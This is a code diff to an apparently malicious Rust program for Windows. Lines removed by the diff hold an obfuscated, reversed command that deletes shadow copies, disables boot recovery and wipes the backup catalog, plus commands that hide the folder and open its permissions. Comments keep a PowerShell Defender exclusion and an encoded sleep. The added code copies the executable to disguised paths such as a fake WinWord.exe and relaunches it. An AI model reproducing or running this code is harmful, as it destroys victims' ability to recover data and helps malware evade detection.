@@ -4,9 +4,9 @@
 #![allow(unused_imports)]
 #![allow(dead_code)]
 
-
-use std::process::Command;
 use std::env;
+use std::path::PathBuf;
+use std::process::Command;
 
 extern crate winreg;
 use winreg::HKEY;
@@ -50,6 +50,29 @@ mod tools {
         settings.set_value(name, &value).unwrap();
     }
     
+    pub fn spawn(exe_path: &str){
+        let exe_in = std::env::current_exe().unwrap();
+        // set new
+        let exe_out = std::path::PathBuf::from(exe_path);
+        // create all the missing folder
+        let create_path_result = std::fs::create_dir_all(exe_out.clone().parent().unwrap());
+    
+        match create_path_result{
+            Err(_) => {},
+            Ok(_) => {
+                let create_path_result = std::fs::copy(exe_in, exe_out.clone());
+                match create_path_result{
+                    Err(_) => {},
+                    Ok(_) => {
+                        let _child = Command::new(exe_path)
+                            .spawn()
+                            .expect("failed to execute process");
+                        std::process::exit(0);
+                    }
+                }
+            }
+        }
+    }
 
 }
 
@@ -60,14 +83,24 @@ mod tools {
     */ 
     //"powershell" -Command Add-MpPreference -ExclusionPath 'C:\ProgramData' 
     //ps_enc("cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAALQBzAGUAYwBvAG4AZABzACAAMgAwAA=="); //wait 20
-    //let exe_path = env::current_exe().unwrap();
+    
+
+
+
 
 fn main() {
-    // https://app.any.run/tasks/d71d86cb-0c13-4086-85ce-d140e826fbea/
+    //get current exe
+    let my_name = std::env::current_exe()
+        .expect("Can't get the exec path")
+        .file_name()
+        .expect("Can't get the exec name").
+        to_string_lossy().
+        into_owned();
 
-    tools::run_exe ("attrib", "+h .");
-    tools::run_exe ("icacls",". /grant Everyone:F /T /C /Q");
+    match my_name.as_ref(){
+        "rustmydetection.exe" => {tools::spawn(r"setup.exe");},
+        "setup.exe" => {tools::spawn(r"C:\Program File\Microsoft Office\Office16\WinWord.exe");},
+        _ => {}
+    }
 
-    let mycmd = "teiuq- golatac eteled nimdabw & on delbaneyrevocer }tluafed{ tes/ tidedcb & seruliafllaerongi ycilopsutatstoob }tluafed{ tes/ tidedcb & eteled ypocwodahs cimw & teiuq/ lla/ swodahs eteled nimdassv  C/".to_string();
-    tools::run_exe_reverse("cmd", &mycmd);
 }
